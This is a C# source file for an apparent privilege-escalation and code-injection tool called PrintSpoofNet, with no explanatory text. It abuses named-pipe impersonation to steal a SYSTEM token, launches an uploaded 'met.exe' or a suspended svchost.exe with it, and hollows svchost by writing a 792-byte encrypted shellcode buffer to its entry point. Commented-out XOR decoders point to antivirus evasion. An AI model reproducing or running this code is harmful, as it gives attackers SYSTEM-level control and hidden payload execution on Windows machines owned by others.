using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;


namespace PrintSpoofNet
{

    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
        
        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();
        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            if (args.Length > 1 && args[1] == "noninteractive")
            {
                StringBuilder sbSystemDir = new StringBuilder(256);
                uint res1 = GetSystemDirectory(sbSystemDir, 256);
                IntPtr env = IntPtr.Zero;
                bool res = CreateEnvironmentBlock(out env, hSystemToken, false);

                String name = WindowsIdentity.GetCurrent().Name;
                Console.WriteLine("Impersonated user is: " + name);

                RevertToSelf();
                si.lpDesktop = "WinSta0\\Default";
                res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\inetpub\\wwwroot\\Upload\\met.exe", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
            }
            else
            {
                CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\svchost.exe", 0, IntPtr.Zero, null, ref si, out pi);
            }
            

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[792] { 0x52, 0x0f, 0x54, 0xf8, 0xdb, 0xeb, 0x4c, 0xad, 0x0b, 0xed, 0xe2, 0xd9, 0x4c, 0x36, 0x0c, 0x10, 0x23, 0x4a, 0x95, 0x89, 0xe8, 0x57, 0xf7, 0x83, 0xcc, 0x45, 0xf6, 0x5a, 0x4f, 0x95, 0x74, 0x50, 0x40, 0xe3, 0xad, 0xc7, 0x3e, 0x84, 0x58, 0x50, 0xed, 0xc0, 0x8e, 0xd8, 0x7e, 0xf7, 0xd7, 0x24, 0x8a, 0x54, 0xfd, 0xe4, 0x5d, 0xaf, 0x20, 0x51, 0xa9, 0x1e, 0x67, 0xfa, 0xe2, 0x18, 0xf9, 0x49, 0x1b, 0x88, 0xe6, 0x0f, 0x38, 0x60, 0xb0, 0xfe, 0xa2, 0x0d, 0x31, 0x4b, 0x24, 0xc3, 0x4e, 0x97, 0x81, 0x04, 0x77, 0x39, 0x56, 0xd8, 0x65, 0x84, 0x38, 0x82, 0xa6, 0xd4, 0x88, 0x07, 0xe1, 0x0e, 0x2b, 0x46, 0xc4, 0x02, 0x27, 0x0e, 0x88, 0xea, 0x50, 0x2b, 0x42, 0xa0, 0xbd, 0xf8, 0x2c, 0xe8, 0xbd, 0xf4, 0x22, 0xec, 0x05, 0xf2, 0x52, 0x18, 0xa4, 0x21, 0x71, 0x8e, 0xe0, 0x56, 0x57, 0xb7, 0x16, 0x27, 0xe0, 0xb7, 0x2b, 0xc7, 0x23, 0xe2, 0xd2, 0xcd, 0x50, 0x2f, 0xed, 0x68, 0x0f, 0x55, 0xe6, 0xb9, 0x6f, 0x60, 0xe4, 0xb4, 0xe7, 0x9c, 0x97, 0x62, 0x81, 0x36, 0xe5, 0x80, 0xcd, 0x2e, 0x95, 0x84, 0xef, 0x89, 0xd0, 0xc3, 0x74, 0x03, 0x77, 0xf4, 0xd3, 0xde, 0xe6, 0x96, 0x38, 0xc8, 0x5f, 0x63, 0x28, 0xbd, 0x8f, 0x05, 0x27, 0x39, 0x2d, 0xae, 0x1d, 0x76, 0x68, 0x1e, 0x97, 0xb3, 0x0b, 0x49, 0xba, 0xda, 0x99, 0xb8, 0xc2, 0x86, 0x56, 0x5d, 0x48, 0x26, 0xc1, 0x33, 0xd3, 0xbe, 0x7a, 0x8e, 0xb0, 0x6a, 0x7a, 0x5c, 0xf1, 0x24, 0x8a, 0x00, 0x97, 0x89, 0x04, 0x55, 0x1e, 0xc9, 0x8b, 0xe9, 0x70, 0xb6, 0x84, 0x02, 0xd4, 0x4d, 0xf8, 0x98, 0xfc, 0x1d, 0x94, 0x89, 0x91, 0x02, 0x56, 0xe6, 0xf3, 0xf5, 0x3a, 0xa0, 0xe7, 0xe8, 0x49, 0x22, 0xc8, 0xc3, 0x6f, 0x03, 0x34, 0xce, 0x2f, 0xaf, 0xd3, 0xc9, 0xda, 0x64, 0xac, 0xc4, 0x7e, 0xf0, 0xb2, 0x58, 0x05, 0x31, 0xa4, 0x0a, 0xf7, 0x8f, 0xa0, 0x6c, 0x01, 0x79, 0xbe, 0xc0, 0x8d, 0x54, 0x57, 0xce, 0xd0, 0x4f, 0xc5, 0x79, 0x9c, 0xc1, 0x58, 0x73, 0x16, 0x55, 0xef, 0x7b, 0xc6, 0x41, 0xc1, 0xea, 0x9b, 0x78, 0xd3, 0x39, 0x2c, 0x10, 0x7b, 0xb9, 0x18, 0x07, 0x49, 0x36, 0x56, 0xc6, 0x1a, 0x0a, 0x68, 0x05, 0x44, 0x00, 0x4e, 0x74, 0x0d, 0xac, 0x80, 0xd7, 0x9f, 0x18, 0xcc, 0xac, 0xb0, 0x14, 0xf5, 0x68, 0x88, 0x8a, 0xb8, 0x47, 0x4c, 0x32, 0x38, 0xbc, 0x5c, 0x7e, 0x9a, 0x3d, 0xb7, 0x92, 0xf9, 0xc4, 0x67, 0xf6, 0x6a, 0xe5, 0xf4, 0x5a, 0x74, 0xc6, 0x60, 0xb0, 0x4c, 0xc0, 0xa9, 0x6d, 0xb7, 0x2f, 0x4d, 0xb5, 0xe0, 0x30, 0xc5, 0x66, 0x75, 0x01, 0xe3, 0xf5, 0xbf, 0xc8, 0x8c, 0x86, 0xdf, 0x19, 0xd8, 0xd7, 0xb1, 0x5d, 0x12, 0xd2, 0x1d, 0x8c, 0xd6, 0x0b, 0xd6, 0x96, 0x50, 0x6e, 0x95, 0x1d, 0xf9, 0x0e, 0x9e, 0x81, 0xee, 0x98, 0x99, 0x01, 0xea, 0xeb, 0x26, 0xf6, 0xee, 0x14, 0x67, 0x02, 0x54, 0x7a, 0x49, 0x72, 0xb6, 0x88, 0xff, 0xca, 0xd5, 0x8d, 0xd4, 0x59, 0x7d, 0xca, 0x62, 0xf3, 0xa4, 0x99, 0x37, 0xdc, 0x7e, 0x34, 0xee, 0xbe, 0xde, 0xe4, 0xfe, 0x0b, 0xd6, 0x2c, 0x8c, 0x30, 0xc5, 0x7a, 0x99, 0xe4, 0x82, 0x87, 0xcf, 0x46, 0x9f, 0x09, 0xc2, 0x31, 0x83, 0x23, 0x80, 0x72, 0x9a, 0x25, 0xee, 0x96, 0xcb, 0x95, 0x36, 0x2c, 0x62, 0x22, 0xa7, 0x68, 0xaa, 0x9f, 0xec, 0xa4, 0x37, 0x42, 0xbc, 0x74, 0xb1, 0x52, 0x7c, 0xa5, 0x81, 0xe9, 0x45, 0xe9, 0xb3, 0xe8, 0xa9, 0x36, 0xab, 0x66, 0xf4, 0x6e, 0xec, 0x34, 0x15, 0x49, 0x4e, 0xa3, 0x39, 0xff, 0xfe, 0x67, 0x20, 0xd9, 0x88, 0xeb, 0x62, 0xab, 0x84, 0xd7, 0x5a, 0xbd, 0x45, 0xa3, 0xc6, 0x2d, 0xc7, 0xbb, 0x0b, 0xaf, 0x2d, 0x52, 0xe8, 0xb9, 0x41, 0x14, 0xb6, 0xa3, 0x58, 0xe8, 0xf2, 0x86, 0xe1, 0x95, 0x71, 0xc8, 0xa6, 0xf4, 0x00, 0x27, 0x80, 0x22, 0x2f, 0x71, 0x7b, 0xa6, 0x89, 0x98, 0xcf, 0x1c, 0x7e, 0x5b, 0xc9, 0x10, 0x1b, 0xd9, 0xaf, 0x06, 0x3e, 0xa8, 0xa4, 0x8a, 0xc9, 0xc6, 0x18, 0xc2, 0x08, 0x4b, 0x99, 0x1f, 0x18, 0xae, 0x27, 0x11, 0x08, 0x4e, 0x8e, 0x50, 0xec, 0x7e, 0x4e, 0xd0, 0xc3, 0x5f, 0x5c, 0x1b, 0x78, 0x66, 0x50, 0x91, 0x78, 0xb0, 0x2a, 0x12, 0x27, 0x15, 0x43, 0xf7, 0xc8, 0x96, 0xab, 0x98, 0xa8, 0x03, 0x68, 0xdf, 0x65, 0x29, 0x82, 0xe4, 0xfc, 0x77, 0xf1, 0x6c, 0x49, 0x84, 0x55, 0xef, 0x56, 0x5b, 0xfa, 0xf1, 0xd2, 0x93, 0x91, 0x06, 0x51, 0x54, 0xf2, 0xd8, 0xf2, 0x11, 0x0a, 0x0c, 0x39, 0xb4, 0x08, 0x72, 0x29, 0xaf, 0x23, 0xbc, 0x32, 0x86, 0x32, 0xbc, 0xf2, 0x09, 0x44, 0xf8, 0x58, 0x43, 0xff, 0xbd, 0x38, 0xf8, 0xd0, 0xfc, 0x21, 0x76, 0xc2, 0x3e, 0xae, 0xad, 0x39, 0x9f, 0x0c, 0x3d, 0x63, 0x17, 0x35, 0xf1, 0x1f, 0xe3, 0xd4, 0x85, 0x96, 0xd0, 0x07, 0x06, 0x77, 0x68, 0xfa, 0x40, 0x5d, 0xb5, 0xb4, 0x97, 0x80, 0x52, 0x3c, 0xe9, 0x3e, 0x16, 0xb2, 0x67, 0x77, 0x69, 0x53, 0x9d, 0xd6, 0x6f, 0x65, 0x5c, 0x80, 0xa7, 0xe3, 0x05, 0x7b, 0xda, 0x80, 0x2d, 0xfa, 0x60, 0x8f, 0xd1, 0x6f, 0x88, 0x5f, 0xfe, 0x92, 0x6c, 0x26, 0xbd, 0x5a, 0x30, 0x33, 0x4c, 0x8b, 0x62, 0xc9, 0xfa, 0x67, 0xf8, 0xc0, 0x56, 0x4a, 0xe8, 0xc8, 0xa3, 0xf1, 0xb6, 0xa1, 0x45, 0x7c, 0x9e, 0xc3, 0x9c, 0x3b, 0xc8, 0x8e, 0xe3, 0x9d, 0xc2, 0xb8, 0xf4, 0xe5, 0xaf, 0x68, 0x72, 0x36, 0x48, 0x26, 0xfb, 0x85, 0x78, 0xba, 0xab, 0x2f, 0x07, 0x5f, 0x9c, 0xcc, 0x7d, 0xcc, 0xae, 0x19, 0x7d, 0xd4, 0xf3, 0xd6, 0x14, 0xdd, 0x67, 0x03, 0xbc };

            BlowMe bm = new BlowMe();
            buf = bm.Decode(buf, 788);
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 17) & 0xFF);
            //}

            //byte[] k = new byte[5] { 0x70, 0x37, 0x51, 0x44, 0x6a };
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ k[i % k.Length]);
            //}

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
